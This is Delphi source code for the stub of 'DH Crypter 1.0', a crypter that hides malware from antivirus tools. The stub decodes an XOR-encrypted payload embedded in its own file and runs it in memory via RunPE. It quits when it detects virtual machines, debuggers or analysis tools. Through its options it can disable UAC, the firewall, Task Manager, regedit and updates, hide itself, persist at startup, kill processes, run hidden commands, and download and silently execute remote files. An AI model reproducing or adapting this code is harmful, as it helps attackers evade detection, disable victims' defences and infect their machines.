// DH Crypter 1.0
// (C) Doddy Hackman 2015
// Credits :
// DH Crypter based in OP Crypter By Xash
// RunPE [uExecFromMem] made by steve10120
// Thanks to Xash and steve10120

program stub;

uses
  SysUtils, StrUtils, Windows, ShellApi, URLMon, TlHelp32, uExecFromMem, tools,
  auxiliar_tools;

type
  otro_array = array of string;

  // Functions

function dhencode(texto, opcion: string): string;
// Thanks to Taqyon
// Based on http://www.vbforums.com/showthread.php?346504-DELPHI-Convert-String-To-Hex
var
  num: integer;
  aca: string;
  cantidad: integer;

begin

  num := 0;
  Result := '';
  aca := '';
  cantidad := 0;

  if (opcion = 'encode') then
  begin
    cantidad := Length(texto);
    for num := 1 to cantidad do
    begin
      aca := IntToHex(ord(texto[num]), 2);
      Result := Result + aca;
    end;
  end;

  if (opcion = 'decode') then
  begin
    cantidad := Length(texto);
    for num := 1 to cantidad div 2 do
    begin
      aca := Char(StrToInt('$' + Copy(texto, (num - 1) * 2 + 1, 2)));
      Result := Result + aca;
    end;
  end;

end;

function regex(text: String; deaca: String; hastaaca: String): String;
begin
  Delete(text, 1, AnsiPos(deaca, text) + Length(deaca) - 1);
  SetLength(text, AnsiPos(hastaaca, text) - 1);
  Result := text;
end;

procedure regex2(texto: string; separador: string; var resultado: otro_array);
// Thanks to ecfisa for the help
var
  numero1: integer;
  numero2: integer;
begin
  texto := texto + separador;
  numero2 := Pos(separador, texto);
  numero1 := 1;
  while numero1 <= numero2 do
  begin
    SetLength(resultado, Length(resultado) + 1);
    resultado[High(resultado)] := Copy(texto, numero1, numero2 - numero1);
    numero1 := numero2 + Length(separador);
    numero2 := PosEx(separador, texto, numero1);
  end;
end;

//

// More Functions

function delay(seconds: integer): string;
begin
  Sleep(seconds * 1000);
  Result := '[+] Delay : OK';
end;

function message_box(title, message_text, type_message: string): string;
begin
  if (type_message = 'Information') then
  begin
    MessageBox(0, Pchar(message_text), Pchar(title), MB_ICONINFORMATION);
  end
  else if (type_message = 'Warning') then
  begin
    MessageBox(0, Pchar(message_text), Pchar(title), MB_ICONWARNING);
  end
  else if (type_message = 'Question') then
  begin
    MessageBox(0, Pchar(message_text), Pchar(title), MB_ICONQUESTION);
  end
  else if (type_message = 'Error') then
  begin
    MessageBox(0, Pchar(message_text), Pchar(title), MB_ICONERROR);
  end
  else
  begin
    MessageBox(0, Pchar(message_text), Pchar(title), MB_ICONINFORMATION);
  end;
  Result := '[+] MessageBox : OK';
end;

function ejecutar(cmd: string): string;
// Credits : Function ejecutar() based in : http://www.delphidabbler.com/tips/61
// Thanks to www.delphidabbler.com

var
  parte1: TSecurityAttributes;
  parte2: TStartupInfo;
  parte3: TProcessInformation;
  parte4: THandle;
  parte5: THandle;
  control2: Boolean;
  contez: array [0 .. 255] of AnsiChar;
  notengoidea: Cardinal;
  fix: Boolean;
  code: string;

begin

  code := '';

  with parte1 do
  begin
    nLength := SizeOf(parte1);
    bInheritHandle := True;
    lpSecurityDescriptor := nil;
  end;

  CreatePipe(parte4, parte5, @parte1, 0);

  with parte2 do
  begin
    FillChar(parte2, SizeOf(parte2), 0);
    cb := SizeOf(parte2);
    dwFlags := STARTF_USESHOWWINDOW or STARTF_USESTDHANDLES;
    wShowWindow := SW_HIDE;
    hStdInput := GetStdHandle(STD_INPUT_HANDLE);
    hStdOutput := parte5;
    hStdError := parte5;
  end;

  fix := CreateProcess(nil, Pchar('cmd.exe /C ' + cmd), nil, nil, True, 0, nil,
    Pchar('c:/'), parte2, parte3);

  CloseHandle(parte5);

  if fix then

    repeat

    begin
      control2 := ReadFile(parte4, contez, 255, notengoidea, nil);
    end;

    if notengoidea > 0 then
    begin
      contez[notengoidea] := #0;
      code := code + contez;
    end;

    until not(control2) or (notengoidea = 0);

  Result := code;

end;

function GetFileByURL(link: string): string;
// Based on : http://www.swissdelphicenter.ch/torry/showcode.php?id=1134
// Thanks to Rainer Kümmerle
var
  resultado: string;
begin
  resultado := Copy(link, LastDelimiter('/', link) + 1,
    Length(link) - (LastDelimiter('/', link)));
  Result := resultado;
end;

procedure cargar_archivo(archivo: TFileName; tipo: string);
var
  Data: SHELLEXECUTEINFO;
begin
  if (FileExists(archivo)) then
  begin
    ZeroMemory(@Data, SizeOf(SHELLEXECUTEINFO));
    Data.cbSize := SizeOf(SHELLEXECUTEINFO);
    Data.fMask := SEE_MASK_NOCLOSEPROCESS;
    Data.Wnd := 0;
    Data.lpVerb := 'open';
    Data.lpFile := Pchar(archivo);
    if (tipo = 'Show') then
    begin
      Data.nShow := SW_SHOWNORMAL;
    end;
    if (tipo = 'Hide') then
    begin
      Data.nShow := SW_HIDE;
    end;
    if not ShellExecuteEx(@Data) then
      if GetLastError <= 32 then
      begin
        SysErrorMessage(GetLastError);
      end;
  end;
end;

function download_and_execute(link, new_name: string): string;
begin
  UrlDownloadToFile(nil, Pchar(link), Pchar(new_name), 0, nil);
  if (FileExists(new_name)) then
  begin
    SetFileAttributes(Pchar(new_name), FILE_ATTRIBUTE_HIDDEN);
    cargar_archivo(Pchar(new_name), 'Hide');
  end;
  Result := '[+] Download & Execute : OK';
end;

function cargar_pagina(pagina: string): string;
begin
  ejecutar('start ' + pagina);
  Result := '[+] Load Page : OK';
end;

function kill_process(proceso: string): string;
// Based on : http://www.swissdelphicenter.ch/torry/showcode.php?id=266
// Thanks to Misha Moellner
var
  seguir: bool;
  var1: THandle;
  var2: TProcessEntry32;
begin
  var1 := CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  var2.dwSize := SizeOf(var2);
  seguir := Process32First(var1, var2);
  while integer(seguir) <> 0 do
  begin
    if (ExtractFileName(var2.szExeFile) = proceso) then
      if (TerminateProcess(OpenProcess($0001, bool(0), var2.th32ProcessID), 0))
      then
      begin
        Result := '[+] Process Killed';
      end
      else
      begin
        Result := '[-] Process not killed';
      end;
    seguir := Process32Next(var1, var2);
  end;
  CloseHandle(var1);
end;

function melt(): string;
var
  ruta: string;
begin
  ruta := GetEnvironmentVariable('TEMP') + '/' + ExtractFileName(paramstr(0));
  MoveFile(Pchar(paramstr(0)), Pchar(ruta));
  Result := '[+] Melt : OK';
end;


//

var
  todo: string;
  opciones: string;
  clave: string;
  codigo: String;
  ops: string;
  datos: otro_array;

var
  nombre_registro: string;

var
  op_delay, op_delay_time, op_startup, op_hide, op_melt: string;
  op_message, op_message_title, op_message_text, op_message_type: string;
  op_execute_this_command, op_command, op_kill_this_process, op_process: string;
  op_open_this_url, op_url, op_download_this_file, op_file_to_download: string;

var
  op_virtual_pc: string;
  op_virtual_box: string;
  op_debug: string;
  op_wireshark: string;
  op_ollydbg: string;
  op_anubis: string;
  op_kaspersky: string;
  op_vmware: string;
  op_uac: string;
  op_firewall: string;
  op_cmd: string;
  op_run: string;
  op_taskmgr: string;
  op_regedit: string;
  op_updates: string;

begin

  nombre_registro := 'uber_nowzz';

  todo := leer_datos(paramstr(0), '0x64685F626C6F71756531',
    '0x64685F626C6F71756532');

  regex2(todo, '0x2D64685F736570617261646F722D', datos);

  if not(datos[2] = '') then
  begin
    clave := dhencode(datos[2], 'decode');
  end;

  codigo := datos[1];
  ops := datos[3];
  opciones := xor_now(ops, StrToInt(clave));

  op_delay := regex(opciones, '[op_delay]', '[op_delay]');
  op_delay_time := regex(opciones, '[op_delay_time]', '[op_delay_time]');
  op_startup := regex(opciones, '[op_startup]', '[op_startup]');
  op_hide := regex(opciones, '[op_hide]', '[op_hide]');
  op_melt := regex(opciones, '[op_melt]', '[op_melt]');

  op_message := regex(opciones, '[op_message]', '[op_message]');
  op_message_title := regex(opciones, '[op_message_title]',
    '[op_message_title]');
  op_message_text := regex(opciones, '[op_message_text]', '[op_message_text]');
  op_message_type := regex(opciones, '[op_message_type]', '[op_message_type]');

  op_execute_this_command := regex(opciones, '[op_execute_this_command]',
    '[op_execute_this_command]');
  op_command := regex(opciones, '[op_command]', '[op_command]');
  op_kill_this_process := regex(opciones, '[op_kill_this_process]',
    '[op_kill_this_process]');
  op_process := regex(opciones, '[op_process]', '[op_process]');

  op_open_this_url := regex(opciones, '[op_open_this_url]',
    '[op_open_this_url]');
  op_url := regex(opciones, '[op_url]', '[op_url]');
  op_download_this_file := regex(opciones, '[op_download_this_file]',
    '[op_download_this_file]');
  op_file_to_download := regex(opciones, '[op_file_to_download]',
    '[op_file_to_download]');

  op_virtual_pc := regex(opciones, '[op_virtual_pc]', '[op_virtual_pc]');
  op_virtual_box := regex(opciones, '[op_virtual_box]', '[op_virtual_box]');
  op_debug := regex(opciones, '[op_debug]', '[op_debug]');
  op_wireshark := regex(opciones, '[op_wireshark]', '[op_wireshark]');
  op_ollydbg := regex(opciones, '[op_ollydbg]', '[op_ollydbg]');
  op_anubis := regex(opciones, '[op_anubis]', '[op_anubis]');
  op_kaspersky := regex(opciones, '[op_kaspersky]', '[op_kaspersky]');
  op_vmware := regex(opciones, '[op_vmware]', '[op_vmware]');

  op_uac := regex(opciones, '[op_uac]', '[op_uac]');
  op_firewall := regex(opciones, '[op_firewall]', '[op_firewall]');
  op_cmd := regex(opciones, '[op_cmd]', '[op_cmd]');
  op_run := regex(opciones, '[op_run]', '[op_run]');
  op_taskmgr := regex(opciones, '[op_taskmgr]', '[op_taskmgr]');
  op_regedit := regex(opciones, '[op_regedit]', '[op_regedit]');
  op_updates := regex(opciones, '[op_updates]', '[op_updates]');

  // Options

  if (op_melt = '1') then
  begin
    melt();
  end;

  if (op_virtual_pc = '1') then
  begin
    if (check_antis('virtual_pc')) then
    begin
      ExitProcess(0);
    end;
  end;

  if (op_virtual_box = '1') then
  begin
    if (check_antis('virtual_box')) then
    begin
      ExitProcess(0);
    end;
  end;

  if (op_debug = '1') then
  begin
    if (check_debug()) then
    begin
      ExitProcess(0);
    end;
  end;

  if (op_wireshark = '1') then
  begin
    if (check_wireshark()) then
    begin
      ExitProcess(0);
    end;
  end;

  if (op_ollydbg = '1') then
  begin
    if (check_ollydbg()) then
    begin
      ExitProcess(0);
    end;
  end;

  if (op_anubis = '1') then
  begin
    if (check_antis('anubis')) then
    begin
      ExitProcess(0);
    end;
  end;

  if (op_kaspersky = '1') then
  begin
    if (check_kaspersky()) then
    begin
      ExitProcess(0);
    end;
  end;

  if (op_vmware = '1') then
  begin
    if (check_antis('vmware')) then
    begin
      ExitProcess(0);
    end;
  end;

  //

  if (op_uac = '1') then
  begin
    disable_uac('on');
  end;

  if (op_firewall = '1') then
  begin
    disable_firewall('seven', 'on');
  end;

  if (op_cmd = '1') then
  begin
    disable_cmd('on');
  end;

  if (op_run = '1') then
  begin
    disable_run('on');
  end;

  if (op_taskmgr = '1') then
  begin
    disable_taskmgr('on');
  end;

  if (op_regedit = '1') then
  begin
    disable_regedit('on');
  end;

  if (op_updates = '1') then
  begin
    disable_updates('on');
  end;


  //

  if (op_hide = '1') then
  begin
    hide_file(Pchar(paramstr(0)));
  end;

  if (op_startup = '1') then
  begin
    add_startup(Pchar(nombre_registro), Pchar(paramstr(0)));
  end;

  if (op_message = '1') then
  begin
    message_box(op_message_title, op_message_text, op_message_type);
  end;

  if (op_execute_this_command = '1') then
  begin
    ejecutar(op_command);
  end;

  if (op_kill_this_process = '1') then
  begin
    kill_process(op_process);
  end;

  if (op_open_this_url = '1') then
  begin
    cargar_pagina(op_url);
  end;

  if (op_download_this_file = '1') then
  begin
    download_and_execute(op_file_to_download,
      GetFileByURL(op_file_to_download));
  end;

  //

  if (op_delay = '1') then
  begin
    delay(StrToInt(op_delay_time));
  end;

  if not(clave = '') then
  begin
    codigo := xor_now(codigo, StrToInt(clave));
    ExecuteFromMem(paramstr(0), '', Pchar(codigo));
  end;

end.
